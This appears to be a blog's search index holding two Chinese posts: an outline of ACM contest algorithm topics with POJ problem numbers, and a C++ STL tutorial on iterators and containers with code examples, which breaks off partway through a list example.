<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ACM目录</title>
    <url>/ACM/contents/2024/03/20/</url>
    <content><![CDATA[<h1 id="ACM主要算法"><a href="#ACM主要算法" class="headerlink" title="ACM主要算法"></a>ACM主要算法</h1><h2 id="一-基本算法-all"><a href="#一-基本算法-all" class="headerlink" title="一.基本算法(all)"></a>一.基本算法(all)</h2><p>(1)枚举(poj1753, poj2965)</p>
<p>(2)贪心(poj1328, poj2109, poj2586)</p>
<p>(3)递归和分治法</p>
<p>(4)递推</p>
<p>(5)构造法(poj3295)</p>
<p>(6)模拟法(poj1068, poj2632, poj1573, poj2993, poj2996)</p>
<p>(1)C++的标准模版库的应用STL(poj3096, poj3007)</p>
<ul>
<li>vector</li>
<li>queue</li>
<li>map</li>
<li>set</li>
<li>stack</li>
<li>unorder</li>
</ul>
<p>(2)大模拟(poj3393, poj1472, poj3371, poj1027, poj2706)</p>
<h2 id="二-搜索-all"><a href="#二-搜索-all" class="headerlink" title="二.搜索(all)"></a>二.搜索(all)</h2><p>(1)深度优先搜索(poj2488, poj3083, poj3009, poj1321, poj2251)</p>
<p>(2)广度优先搜索(poj3278, poj1426, poj3126, poj3087, poj3414)</p>
<p>(3)简单搜索技巧和剪枝(poj2531, poj1416, poj2676, 1129)</p>
<p>(1)最优化剪枝和可行性剪枝:&lt;&lt;小木棍&gt;&gt;</p>
<p>(2)搜索的技巧和优化(poj3411, poj1724)</p>
<p>(3)记忆化搜索(poj3373, poj1691)</p>
<p>(1)较麻烦的搜索题目训练(poj1069, poj3322, poj1475, poj1924, poj2049, poj3426)</p>
<p>(2)广搜的状态优化：利用M进制数存储状态、转化为串用hash表判重、按位压缩存储状态、双向广搜、A*算法(poj1768, poj1184, poj1872, poj1324, poj2046, poj1482)</p>
<p>(3)深搜的优化：尽量用位运算、一定要加剪枝、函数参数尽可能少、层数不易过大、可以考虑双向搜索或者是轮换搜索、IDA*算法(poj3131, poj2870, poj2286)</p>
<h2 id="三-图论-wsy-zhz"><a href="#三-图论-wsy-zhz" class="headerlink" title="三.图论(wsy|zhz)"></a>三.图论(wsy|zhz)</h2><p>(1)图的深度优先遍历和广度优先遍历</p>
<p>(2)最短路径算法(dijkstra, bellman-ford, floyd, heap+dijkstra)(poj1860, poj3259, poj1062, poj2253, poj1125, poj2240)</p>
<p>(3)最小生成树算法(prim, kruskal)(poj1789, poj2485, poj1258, poj3026)</p>
<p>(4)拓扑排序(poj1094)</p>
<p>(5)二分图的最大匹配(匈牙利算法)(poj3041, poj3020)</p>
<p>&#x2F;&#x2F;(6)最大流的增广路算法(KM算法)(poj1459, poj3436)</p>
<p>(1)差分约束系统的建立和求解(poj1201, poj2983)</p>
<p>&#x2F;&#x2F;(2)最小费用最大流(poj2516, poj2195)</p>
<p>(3)双连通分量(poj2942)</p>
<p>(4)强连通分支及其缩点(poj2186)</p>
<p>(5)图的割边和割点(poj3352)</p>
<p>&#x2F;&#x2F;(6)最小割模型、网络流规约(poj3308)</p>
<p>(1)限制最小生成树和第K最短路(poj1639)</p>
<p>(2)最短路，最小生成树，二分图，最大流问题的相关理论(主要是模型建立和求解)(poj3155, poj2112, poj1966, poj3281, poj1087, poj2289, poj3216, poj2446)</p>
<p>(3)最优比率生成树(poj2728)</p>
<p>(4)最小树形图(poj3164)</p>
<p>(5)次小生成树</p>
<p>(6)无向图、有向图的最小环</p>
<h2 id="四-数据结构-wsy-wty"><a href="#四-数据结构-wsy-wty" class="headerlink" title="四.数据结构(wsy|wty)"></a>四.数据结构(wsy|wty)</h2><p>(2)排序(快排、归并排(与逆序数有关)、堆排)(poj2388, poj2299)</p>
<p>(3)简单并查集的应用</p>
<p>(4)哈希表和二分查找等高效查找法(数的Hash, 串的Hash)(poj3349, poj3274, POJ2151, poj1840, poj2002, poj2503)</p>
<p>(5)哈夫曼树(poj3253)</p>
<p>(6)堆stl</p>
<p>(7)trie树(静态建树、动态建树)(poj2513)</p>
<p>(1)线段树(poj2528, poj2828, poj2777, poj2886, poj2750)</p>
<p>(2)静态二叉检索树(poj2482, poj2352)</p>
<p>(3)树状树组(poj1195, poj3321)</p>
<p>(4)RMQ(poj3264, poj3368)</p>
<p>(5)并查集的高级应用(poj1703, 2492)</p>
<p>(1)trie图的建立和应用(poj2778)</p>
<p>(2)LCA和RMQ问题(LCA(最近公共祖先问题)，有离线算法(并查集+dfs)和在线算法(RMQ+dfs))(poj1330)</p>
<p>(3)双端队列和它的应用(维护一个单调的队列，常常在动态规划中起到优化状态转移的目的)(poj2823)</p>
<p>(4)左偏树(可合并堆)</p>
<p>(5)后缀树(非常有用的数据结构，也是赛区考题的热点)(poj3415,poj3294)</p>
<h2 id="五-字符串-zhz-wty"><a href="#五-字符串-zhz-wty" class="headerlink" title="五.字符串(zhz|wty)"></a>五.字符串(zhz|wty)</h2><ol>
<li>常用STL方法</li>
<li>manacher算法</li>
<li>字符串<a href="https://so.csdn.net/so/search?q=Hash&spm=1001.2101.3001.7020">Hash</a></li>
<li>KMP<br>4.1普通KMP<br>4.2扩展KMP</li>
<li>Trie(字典树)<br>5.1 字典树<br>5.1 01字典树</li>
<li>自动机<br>6.1 AC自动机<br>6.2 AC自动机上的动态规划<br>6.3 回文自动机(回文树)</li>
</ol>
<h2 id="六-动态规划-wty-zhz"><a href="#六-动态规划-wty-zhz" class="headerlink" title="六.动态规划(wty|zhz)"></a>六.动态规划(wty|zhz)</h2><p>(1)背包问题(poj1837, poj1276)</p>
<p>(2)型如下表的简单DP(可参考lrj的书page149)：</p>
<p>1.E[j]&#x3D;opt{D+w(i,j)} (poj3267, poj1836, poj1260, poj2533)</p>
<p>2.E[i,j]&#x3D;opt{D[i-1,j]+xi,D[i,j-1]+yj,D[i-1][j-1]+zij} (最长公共子序列)(poj3176, poj1080, poj1159)</p>
<p>3.C[i,j]&#x3D;w[i,j]+opt{C[i,k-1]+C[k,j]} (最优二分检索树问题)</p>
<p>(1)较为复杂的动态规划(如动态规划解特别的施行商问题等)(poj1191, poj1054, poj3280, poj2029, poj2948, poj1925, poj3034)</p>
<p>(2)记录状态的动态规划(poj3254, poj2411, poj1185)</p>
<p>(3)树型动态规划(poj2057, poj1947, poj2486, poj3140)</p>
<p>(1)需要用数据结构优化的动态规划(poj2754, poj3378, poj3017)</p>
<p>(2)四边形不等式理论</p>
<p>(3)较难的状态DP(poj3133)</p>
<h2 id="七-数学-wsy-wty"><a href="#七-数学-wsy-wty" class="headerlink" title="七.数学(wsy|wty)"></a>七.数学(wsy|wty)</h2><p>(1)组合数学</p>
<p>1.加法原理和乘法原理</p>
<p>2.排列组合</p>
<p>3.递推关系(poj3252, poj1850, poj1019, poj1942)</p>
<p>(2)数论</p>
<p>1.素数与整除问题</p>
<p>2.进制位</p>
<p>3.同余模运算(poj2635, poj3292, poj1845, poj2115)</p>
<p>(3)计算方法</p>
<p>1.二分法求解单调函数相关知识(poj3273, poj3258, poj1905, poj3122)</p>
<p>&#x2F;&#x2F;七、计算几何学</p>
<p>(1)几何公式</p>
<p>(2)叉积和点积的运用(如线段相交的判定，点到线段的距离等)(poj2031, poj1039)</p>
<p>(3)多边型的简单算法(求面积)和相关判定(点在多边型内，多边型是否相交)(poj1408, poj1584)</p>
<p>(4)凸包(poj2187, poj1113)</p>
<p>(1)组合数学</p>
<p>1.容斥原理</p>
<p>2.抽屉原理</p>
<p>3.置换群与Polya定理(poj1286, poj2409, poj3270, poj1026)</p>
<p>4.递推关系和母函数</p>
<p>(2)数学</p>
<p>1.高斯消元法(poj2947, poj1487, poj2065, poj1166, poj1222)</p>
<p>2.概率问题(poj3071, poj3440)</p>
<p>3.GCD、扩展的欧几里德(中国剩余定理)(poj3101)</p>
<p>(3)计算方法</p>
<p>1.0&#x2F;1分数规划(poj2976)</p>
<p>2.三分法求解单峰(单谷)的极值</p>
<p>3.矩阵法(poj3150, poj3422, poj3070)</p>
<p>(1)组合数学</p>
<p>1.MoBius反演(poj2888, poj2154)</p>
<p>2.偏序关系理论</p>
<p>(2)博奕论</p>
<p>1.极大极小过程(poj3317, poj1085)</p>
<p>2.Nim问题</p>
<h2 id="八-计算几何学-none"><a href="#八-计算几何学-none" class="headerlink" title="八.计算几何学(none)"></a>八.计算几何学(none)</h2><p>(1)坐标离散化</p>
<p>(2)扫描线算法(例如求矩形的面积和周长，并常和线段树或堆一起使用)(poj1765, poj1177, poj1151, poj3277, poj2280, poj3004)</p>
<p>(3)多边形的内核(半平面交)(poj3130, poj3335)</p>
<p>(4)几何工具的综合应用(poj1819, poj1066, poj2043, poj3227, poj2165, poj3429)</p>
<p>1)半平面求交(poj3384, poj2540)</p>
<p>(2)可视图的建立(poj2966)</p>
<p>(3)点集最小圆覆盖</p>
<p>(4)对踵点(poj2079)</p>
]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>STL_notes</title>
    <url>/ACM/stl/2024/02/07/</url>
    <content><![CDATA[<h3 id="何为STL"><a href="#何为STL" class="headerlink" title="何为STL"></a>何为STL</h3><p><strong>STL(Standard Template Library)</strong> 即<strong>标准模板库</strong>。它是一个具有工业强度，高效的C++程序库。它包含了诸多在计算机科学领域里所常用的基本数据结构和算法。这些数据结构可以与标准算法一起很好的工作，这为我们的软件开发提供了良好的支持。如果你还不理解它的重要性，那我换个说法。这就好比你去打架，你不会使用STL，那就手里的武器就相当于弹弓。敌人熟练使用STL，人家手里拿的是AK47，开着坦克。</p>
<p> #include<iostream>#include<algorithm>#include<vector>#include<queue>#include<iomanip>#include<cmath>#include<cstdio>#include<cstring>#include<map>#include<set>#include<ctime>#include<stack>using namespace std;template<typename T>inline void read(T&amp; x) {    x &#x3D; 0;    bool flg &#x3D; 0;    char c &#x3D; getchar();    for (; !isdigit(c); c &#x3D; getchar())        if (c &#x3D;&#x3D; ‘-‘)flg &#x3D; 1;    for (; isdigit(c); c &#x3D; getchar())x &#x3D; x * 10 + (c ^ 48);    if (flg)x &#x3D; -x;}c++</p>
<ul>
<li><p>迭代器(iterator)</p>
</li>
<li><p>容器(container)</p>
</li>
<li><p>算法(algorithm)</p>
</li>
<li><p>仿函数(function object)</p>
</li>
<li><p>适配器(Adaptor)</p>
</li>
<li><p>空间配制器(allocator)</p>
</li>
</ul>
<p>仿函数和空间配制器不是很常用，我们主要讨论一下迭代器，容器，算法和适配器。其中，我们以容器的用法为重点。</p>
<h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p>迭代器在STL中起着粘合剂的作用，它将算法和容器联系起来，主要用来存取容器中的元素。几乎所有的算法都是通过迭代器存取元素进行工作的。每一个容器也都定义了其本身所专有的迭代器，用以存取容器中的元素。想象一下，你面前有一缸水(缸就好比容器)，你喝水需要要到瓢(咱是文明人，不带用双手直接捧着喝的)。这个瓢就相当于迭代器，你可以用它来打水喝，也可以用瓢来把水缸装满。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v;        <span class="comment">// 定义一个vector容器</span></span><br><span class="line"></span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">1</span>);        <span class="comment">// 向容器中添加3个元素</span></span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历向量的元素</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;::iterator b = v.<span class="built_in">begin</span>();        <span class="comment">// 指向容器的第一个元素</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;::iterator e = v.<span class="built_in">end</span>();            <span class="comment">// 指向容器尾元素的下一个位置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11新标准的写法, auto关键字为类型推断，由编译器自动完成</span></span><br><span class="line">    <span class="comment">// auto b = v.begin();</span></span><br><span class="line">    <span class="comment">// auto e = v.end();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator iter = b; iter != e; ++iter)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; *iter &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>迭代器的使用，上面给了一段简单的代码，我们来精析一下。</p>
<p>迭代器最常用到的就是<strong>begin</strong>和<strong>end</strong>成员。其中begin成员负责返回指向第一个元素。end成员则负责返回指向容器的“ <strong>尾元素的下一个位置(one past the end)</strong> ”。要特别注意end成员不是指向尾元素，而是指向尾元素的下一个位置！ end成员返回的迭代器也叫尾后迭代器(off-the-end iterator)，简称尾迭代器。</p>
<p>如果容器为空呢？那么begin和end返回的是同一个迭代器，都是<strong>尾后迭代器</strong>。</p>
<p>这里要注意一下for循环的循环条件。</p>
<ul>
<li><p>初始化语句：vector<int>::iterator iter &#x3D; b; 如果你的环境支撑C++11标准，那么强烈建议你写成auto iter &#x3D; b; 即使用类型自动推断关键字auto。使用auto使程序更为简洁，也不会出错，由编译器自动推断。</p>
</li>
<li><p>条件语句 iter !&#x3D; e; 一般的for循环里我们会用itet &lt; e 这样的形式，当然，在vector里改成这样也是可以的。但是，并非所有的容器都重载了 &lt; 运算符，所有的容器都重载了&#x3D;&#x3D; 和 !&#x3D; 运算符。所以我们应该习惯使用 &#x3D;&#x3D; 和 !&#x3D; 运算符。</p>
</li>
<li><p>表达式语句 ++iter。 建议使用前置++而非后置++。 在迭代器中，前置++的效率高于后置++。实际上，除非逻辑需要，一般都使用前置++ 进行向前迭代。关于前置++和后置++的本质区别，看官可自行查看其它资料。</p>
</li>
</ul>
<p><strong>标准容器迭代器的运算符:</strong></p>
<ul>
<li><p>*iter： 返回迭代器iter所指元素的引用</p>
</li>
<li><p>iter-&gt;mem: 解引用iter并获取该元素的名为mem的成员，等价于(*item).mem</p>
</li>
<li><p>++iter: 另iter指向容器的下一个元素</p>
</li>
<li><p>–iter: 另iter指向元素的前一个元素</p>
</li>
<li><p>iter1 &#x3D;&#x3D; iter2：判断两个迭代器是否相等</p>
</li>
<li><p>iter1 !&#x3D; iter2: 判断两个迭代器是否不相等<br><strong>迭代器类型：</strong></p>
</li>
<li><p>iterator ：可读可写。</p>
</li>
<li><p>const_iterator ： 可读不可写。使用迭代器带c的版本来返回，尤其是使用auto关键字的时候。</p>
</li>
</ul>
<p><strong>迭代器的范围:</strong></p>
<p><strong>迭代器范围(iterator range)</strong> 由一对迭代器表示，最常见的就是begin和end。begin和end所表示的范围恰好是容器的全部元素。这是一个左闭合区间(left-inclusive interval),其标准的数学表达式为:</p>
<p><strong>[begin,end)</strong></p>
<p><strong>其他迭代器:</strong></p>
<p>除了为每个容器定义迭代器外，标准库在头文件 iterator中还定义了额外几种迭代器，这些迭代器包括以下几种。</p>
<ul>
<li><p>插入迭代器(insert iterator)： 这些迭代器被绑定到一个容器上，可用来向容器中插入元素。</p>
</li>
<li><p>流迭代器(stream iterator)： 这些迭代器被绑定到输入或输出流上，可用来遍历相关的IO流。</p>
</li>
<li><p>反向迭代器(reverse iterator) 这些迭代器和正常的迭代器移动方向相反。例如++操作是指向前一个元素。除了forward_list之外的标准库库容器都有反向迭代器。即<strong>迭代器的r版本</strong>。</p>
</li>
<li><p>移动迭代器(move iterator) 这些专用的迭代器不是拷贝其中的元素，而是移动它们。</p>
</li>
</ul>
<p><strong>迭代器类别:</strong></p>
<p>算法所要求的迭代器可以分为5个迭代器类别(iterator category)。</p>
<ul>
<li><p>输入迭代器 : 只读，不写。单遍扫描，只能递增。</p>
</li>
<li><p>输出迭代器 ： 只写，不读。单遍扫描，只能递增。</p>
</li>
<li><p>前向迭代器 ： 可读可写。多遍扫描，只能递增。</p>
</li>
<li><p>双向迭代器 ： 可读可写。多遍扫描，可递增递减。</p>
</li>
<li><p>随机访问迭代器 ： 可读可写。多遍扫描，支持全部迭代器运算。</p>
</li>
</ul>
<p>下面的例子演示一下迭代器的运算，c版本的迭代器，r版本的迭代器。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v;        <span class="comment">// 定义一个vector容器</span></span><br><span class="line"></span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">1</span>);        <span class="comment">// 向容器中添加5个元素</span></span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">4</span>);</span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用c版本的迭代器</span></span><br><span class="line">    <span class="keyword">auto</span> b = v.<span class="built_in">cbegin</span>();    <span class="comment">// 带c版本的迭代器表示const_iterator类型的迭代器</span></span><br><span class="line">    <span class="keyword">auto</span> e = v.<span class="built_in">cend</span>();        <span class="comment">// 指向容器尾元素的下一个位置</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> iter = b; iter != e; ++iter)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// *iter *= 2;            // 报错，试图给常量赋值！</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反向输出容器中的元素，使用r版本的迭代器</span></span><br><span class="line">    <span class="keyword">auto</span> rb = v.<span class="built_in">rbegin</span>();        <span class="comment">// 实际指向尾元素</span></span><br><span class="line">    <span class="keyword">auto</span> re = v.<span class="built_in">rend</span>();            <span class="comment">// 指向第一个元素的前一个位置</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> iter = rb; iter != re; ++iter)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; *iter &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进行迭代器的运算，输出容器的中间元素</span></span><br><span class="line">    <span class="keyword">auto</span> mid = v.<span class="built_in">begin</span>() + v.<span class="built_in">size</span>() / <span class="number">2</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;该容器的中间元素为:&quot;</span> &lt;&lt; *mid &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><p>容器的定义是：<strong>特定类型对象的集合。</strong></p>
<p>在没有使用容器之前，我们可能会用数组解决一些问题。使用数组解决问题，那么我们必须要知道或者估算出大约要存储多少个对象，这样我们会创建能够容纳这些对象的内存空间大小。当我们要处理一些完全不知道要存储多少对象的问题时，数组显的力不从心。我们可以使用容器来解决这个问题。容器具有很高的可扩展性，我们不需要预先告诉它要存储多少对象，只要创建一个容器，并合理的调用它所提供的方法，所有的处理细节由容器自身完成。</p>
<blockquote>
<p>新标准库的容器的性能几乎肯定与最精心优化过的同类数据结构一样好(通常会更好)。现代C++程序应该使用标准容器库，而不是更原始的数据结构，如内置数组。</p>
</blockquote>
<p><strong>通用容器的分类</strong></p>
<p>通用容器分为3类：顺序容器、关联容器、容器适配器。</p>
<p><strong>顺序容器</strong></p>
<p>顺序容器是一种元素之间有顺序的线性表，是一种线性结构的可序群集。这和我们数据结构课程上所讲的线性表是一样的。顺序容器中的每个元素位置是固定的，除非你使用了插入或者删除操作改变了这个位置。顺序容器不会根据元素的特点排序而是直接保存了元素操作时的逻辑顺序。比如我们一次性对一个顺序容器追加三个元素，这三个元素在容器中的相对位置和追加时的逻辑次序是一致的。</p>
<p>顺序容器都提供了快速顺序访问元素的能力。但是，他们在以下方面都有不同的性能折中：</p>
<ul>
<li><p>向容器中添加或者向容器中删除元素的代价。(不是末端)</p>
</li>
<li><p>非顺序访问容器中元素的代价。</p>
</li>
</ul>
<p><strong>顺序容器的类型：</strong></p>
<ul>
<li><p>vector : 可变大小数组，支持快速随机访问。在尾部之外的位置插入或者删除元素可能很慢。</p>
</li>
<li><p>deque : 双端队列。支持快速随机访问。在头尾位置插入、删除速度很快。</p>
</li>
<li><p>list : 双向链表。只支持双向顺序访问。在list中任何位置进行插入、删除操作速度都很快。</p>
</li>
<li><p>forward_list : 单向链表。只支持单向顺序访问。在链表的任何位置进行插入、删除操作都很快。(C++11标准新加)</p>
</li>
<li><p>array : 固定大小数组。支持快速随机访问。不能添加或者删除元素。(C++11标准新加)</p>
</li>
<li><p>string : 与vector相似的容器，但专门用于保存字符。随机访问快，在尾部插入删除快。</p>
</li>
</ul>
<p>如何选择呢？是不是又犯了选择困难症？ 我们一般对症下药，了解这些容器的特性，根据自己的编程需求选择适合的容器。vector、deque和list这三者我们可以优先考虑vector。vector容器适用于大量读写，而插入、删除比较少的操作。list容器适用于少量读写，大量插入，删除的情况。deque折中了vector和deque， 如果你需要随机存取又关心数据的插入和删除，那么可以选择deque。forward_list适用于符合它这种逻辑结构的情况，array一般用来代替原生的数组。string用于和字符串操作有关的一些情况，也是实际开发中应用最多的。</p>
<p>关于各容器的操作，实在是太多了，下面的示例程序列举一些比较常见的操作和用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;forward_list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*--------------------- vector容器的一些操作  ------------------*/</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; vect1;            <span class="comment">// 定义一个vector容器</span></span><br><span class="line">    vect1.<span class="built_in">push_back</span>(<span class="number">1</span>);            <span class="comment">// push_back: 向容器的末尾添加元素</span></span><br><span class="line">    vect1.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">    vect1.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line">    vect1.<span class="built_in">pop_back</span>();            <span class="comment">// pop_back: 去除末尾的元素</span></span><br><span class="line"></span><br><span class="line">    vect1.<span class="built_in">insert</span>(vect1.<span class="built_in">begin</span>() + <span class="number">1</span>, <span class="number">8</span>);    <span class="comment">// 在某个位置插入一个元素,效率低，不适合大批操作</span></span><br><span class="line">    vect1.<span class="built_in">at</span>(<span class="number">0</span>);                        <span class="comment">// at:取某个位置的元素</span></span><br><span class="line">    vect1.<span class="built_in">capacity</span>();                    <span class="comment">// capacity: 不分配新的内存空间的前提下它最多能保存多少元素。这个和下面的size 是有区别的！！</span></span><br><span class="line">    vect1.<span class="built_in">size</span>();                        <span class="comment">// size: 已经保存的元素的数目</span></span><br><span class="line">    vect1.<span class="built_in">empty</span>();                        <span class="comment">// empty：判断容器是否为空</span></span><br><span class="line">    vect1.<span class="built_in">front</span>();                        <span class="comment">// front：取第一个元素</span></span><br><span class="line">    vect1.<span class="built_in">back</span>();                        <span class="comment">// back：取最后一个元素</span></span><br><span class="line">    vect1.<span class="built_in">erase</span>(vect1.<span class="built_in">begin</span>() + <span class="number">1</span>);        <span class="comment">// erase：删除指定位置的元素</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; vect2;</span><br><span class="line">    vect2.<span class="built_in">assign</span>(vect1.<span class="built_in">begin</span>(), vect1.<span class="built_in">end</span>()); <span class="comment">// 赋值操作</span></span><br><span class="line">    <span class="comment">/*------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他容器操作都和vector差不多，以下列举一些其他容器特有的操作</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*--------------------- string容器一些操作  --------------------*/</span></span><br><span class="line">    string str1 = <span class="string">&quot;Hello Ace&quot;</span>;            <span class="comment">// string的几种构造方法</span></span><br><span class="line">    <span class="function">string <span class="title">str2</span><span class="params">(<span class="string">&quot;Hello World&quot;</span>)</span></span>;        </span><br><span class="line">    <span class="function">string <span class="title">str3</span><span class="params">(str1, <span class="number">6</span>)</span></span>;                <span class="comment">// 从str1下标6开始构造， str3 -&gt; Ace</span></span><br><span class="line"></span><br><span class="line">    string str4 = str2.<span class="built_in">substr</span>(<span class="number">0</span>, <span class="number">5</span>);    <span class="comment">// 求子串： str4 -&gt; Hello</span></span><br><span class="line">    string str5 = str2.<span class="built_in">substr</span>(<span class="number">6</span>);        <span class="comment">// 求子串： str5 -&gt; World</span></span><br><span class="line">    string str6 = str2.<span class="built_in">substr</span>(<span class="number">6</span>, <span class="number">11</span>);    <span class="comment">// 求子串： str6 -&gt; World</span></span><br><span class="line">    <span class="comment">// string str7 = str2.substr(12);    // 抛异常： out_of_range</span></span><br><span class="line"></span><br><span class="line">    string str8 = str2.<span class="built_in">replace</span>(<span class="number">6</span>, <span class="number">5</span>, <span class="string">&quot;Game&quot;</span>);    <span class="comment">// 替换：str8 -&gt; Hello Game 从位置6开始，删除5个字符，并替换成&quot;Game&quot;</span></span><br><span class="line"></span><br><span class="line">    string str9 = str2.<span class="built_in">append</span>(<span class="string">&quot;, Hello Beauty&quot;</span>);<span class="comment">// 追加字符串： str9 -&gt; Hello World, Hello Beauty</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> pos1 = str1.<span class="built_in">find</span>(<span class="string">&quot;Ace&quot;</span>);                <span class="comment">// 查找字符串    : pos1 -&gt; 6 ,返回第一次出现字符串的位置，如果没找着，则返回npos</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> res = str1.<span class="built_in">compare</span>(<span class="string">&quot;Hello, Ace&quot;</span>);        <span class="comment">// 比较字符串： res -&gt; -1, 根据str1是等于、大于还是小于参数指定的字符串， 返回0、整数或者负数</span></span><br><span class="line"></span><br><span class="line">    string str10 = <span class="string">&quot;Pi = 3.14159&quot;</span>;</span><br><span class="line">    <span class="type">double</span> pi = <span class="built_in">stod</span>(str10.<span class="built_in">substr</span>(str10.<span class="built_in">find_first_of</span>(<span class="string">&quot;+-.0123456789&quot;</span>)));    <span class="comment">// 数值转换： pi -&gt; 3.14159</span></span><br><span class="line">    <span class="comment">/*------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*--------------------- deque容器一些操作  --------------------*/</span></span><br><span class="line">    deque&lt;<span class="type">int</span>&gt; d1;</span><br><span class="line">    d1.<span class="built_in">push_back</span>(<span class="number">1</span>);                            <span class="comment">// 尾后压入元素</span></span><br><span class="line">    d1.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">    d1.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line">    d1.<span class="built_in">push_front</span>(<span class="number">4</span>);                            <span class="comment">// 队头压入元素</span></span><br><span class="line">    d1.<span class="built_in">push_front</span>(<span class="number">5</span>);</span><br><span class="line">    d1.<span class="built_in">push_front</span>(<span class="number">6</span>);</span><br><span class="line">    d1.<span class="built_in">pop_back</span>();                                <span class="comment">// 尾后弹出一个元素</span></span><br><span class="line">    d1.<span class="built_in">pop_front</span>();                                <span class="comment">// 队头弹出一个元素</span></span><br><span class="line"></span><br><span class="line">    d1.<span class="built_in">front</span>();                                    <span class="comment">// 取队头元素</span></span><br><span class="line">    d1.<span class="built_in">back</span>();                                    <span class="comment">// 取队尾元素</span></span><br><span class="line">    <span class="comment">/*------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*--------------------- list容器一些操作  --------------------*/</span></span><br><span class="line">    list&lt;<span class="type">int</span>&gt; l;</span><br><span class="line">    l.<span class="built_in">push_back</span>(<span class="number">1</span>);                                <span class="comment">// 尾后压入元素</span></span><br><span class="line">    l.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">    l.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line">    l.<span class="built_in">push_front</span>(<span class="number">4</span>);                            <span class="comment">// 